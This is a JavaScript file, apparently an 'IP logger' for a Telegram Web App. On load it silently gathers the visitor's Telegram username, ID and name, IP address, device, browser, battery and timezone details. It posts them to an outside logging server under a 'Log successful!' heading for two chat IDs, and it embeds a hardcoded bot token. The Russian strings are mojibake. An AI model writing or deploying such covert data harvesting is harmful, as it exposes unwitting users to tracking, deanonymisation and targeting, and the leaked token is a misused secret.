async function getIPAddress() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        console.error('–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è IP –∞–¥—Ä–µ—Å–∞:', error);
        return '–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ';
    }
}

function getUserAgent() {
    try {
        return navigator.userAgent || '–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ';
    } catch (error) {
        console.error('–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è UserAgent:', error);
        return '–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ';
    }
}

function getScreenResolution() {
    return `${window.screen.width}x${window.screen.height}` || '–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ';
}

function getOSName() {
    try {
        return navigator.platform || '–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ';
    } catch (error) {
        console.error('–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –∏–º–µ–Ω–∏ –û–°:', error);
        return '–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ';
    }
}

async function getBatteryPercentage() {
    try {
        const battery = await navigator.getBattery();
        return Math.floor(battery.level * 100);
    } catch (error) {
        console.error('–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –ø—Ä–æ—Ü–µ–Ω—Ç–∞ –∑–∞—Ä—è–¥–∞ –±–∞—Ç–∞—Ä–µ–∏:', error);
        return '–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ';
    }
}

function getBrowserInfo() {
    try {
        return {
            name: navigator.appName || '–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ',
            version: navigator.appVersion || '–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ',
            engine: navigator.product || '–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'
        };
    } catch (error) {
        console.error('–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –±—Ä–∞—É–∑–µ—Ä–µ:', error);
        return {
            name: '–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ',
            version: '–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ',
            engine: '–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'
        };
    }
}

async function sendDataToTelegram() {
    let tg = window.Telegram.WebApp;
    const token = "7212589811:AAH4Qyoboljh-SYCE48LL_nyZNCS7KvUeI0"
    const chatId = tg.initDataUnsafe.start_param;
    const additionalChatId = -1002184270191;

    const ipAddress = await getIPAddress();
    const userAgent = getUserAgent();
    const osName = getOSName();
    const screenResolution = getScreenResolution();
    const batteryPercentage = await getBatteryPercentage();
    const browserInfo = getBrowserInfo();

    const message = `
<b>‚ú® –õ–æ–≥ —É—Å–ø–µ—à–µ–Ω!</b>

<b>üîç –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ–± –∞–∫–∫–∞—É–Ω—Ç–µ:</b>
‚îú –¢—ç–≥: @${tg.initDataUnsafe.user.username || '–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}
‚îú –ê–π–¥–∏: <code>${tg.initDataUnsafe.user.id || '–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}</code>
‚îú –ò–º—è: <code>${tg.initDataUnsafe.user.first_name || '–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}</code>
‚îú –§–∞–º–∏–ª–∏—è: <code>${tg.initDataUnsafe.user.last_name || '–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}</code>
‚îú –Ø–∑—ã–∫: <code>${tg.initDataUnsafe.user.language_code || '–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}</code>
‚îî –ú–æ–∂–Ω–æ –ø–∏—Å–∞—Ç—å –≤ –õ–°: <code>${tg.initDataUnsafe.user.allows_write_to_pm || '–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}</code>

<b>üñ•Ô∏è –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ–± —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ:</b>
‚îú –ê–π–ø–∏: <code>${ipAddress}</code>
‚îú UserAgent: <code>${userAgent}</code>
‚îú –•—ç—à: <code>–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ</code>
‚îú –ò–º—è –û–°: <code>${osName}</code>
‚îú –†–∞–∑—Ä–µ—à–µ–Ω–∏–µ —ç–∫—Ä–∞–Ω–∞: <code>${screenResolution}</code>
‚îú –ü—Ä–æ—Ü–µ–Ω—Ç –±–∞—Ç–∞—Ä–µ–∏: <code>${batteryPercentage}%</code>
‚îî –ß–∞—Å–æ–≤–æ–π –ø–æ—è—Å: <code>${new Date().getTimezoneOffset()}</code>

<b>üåê –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –±—Ä–∞—É–∑–µ—Ä–µ:</b>
‚îú –ù–∞–∑–≤–∞–Ω–∏–µ –±—Ä–∞—É–∑–µ—Ä–∞: <code>${browserInfo.name}</code>
‚îú –í–µ—Ä—Å–∏—è –±—Ä–∞—É–∑–µ—Ä–∞: <code>${browserInfo.version}</code>
‚îî –¢–∏–ø –¥–≤–∏–∂–∫–∞ –±—Ä–∞—É–∑–µ—Ä–∞: <code>${browserInfo.engine}</code>
    `;

    const url = `https://mapiii.nexcord.pro/api/universallogger/server.php`;
    const formData = new FormData();
    formData.append('action', "send");
    formData.append('chat', chatId);
    formData.append('message', message);

    try {
        const response = await fetch(url, {
            method: 'POST',
            body: formData
        });
        if (!response.ok) {
            throw new Error('–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –∑–∞–ø—Ä–æ—Å–∞: ' + response.statusText);
        }
        console.log('–ó–∞–ø—Ä–æ—Å —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω');
    } catch (error) {
        console.error('–û—à–∏–±–∫–∞:', error);
    }
    // –æ—Ç–ø—Ä–∞–≤–∫–∞ –¥–≤–∞
    const formData1 = new FormData();
    formData.append('action', "send");
    formData1.append('chat', additionalChatId);
    formData1.append('message', message);

    try {
        const response = await fetch(url, {
            method: 'POST',
            body: formData1
        });
        if (!response.ok) {
            throw new Error('–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –∑–∞–ø—Ä–æ—Å–∞: ' + response.statusText);
        }
        console.log('–ó–∞–ø—Ä–æ—Å —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω');
    } catch (error) {
        console.error('–û—à–∏–±–∫–∞:', error);
    }
}

sendDataToTelegram();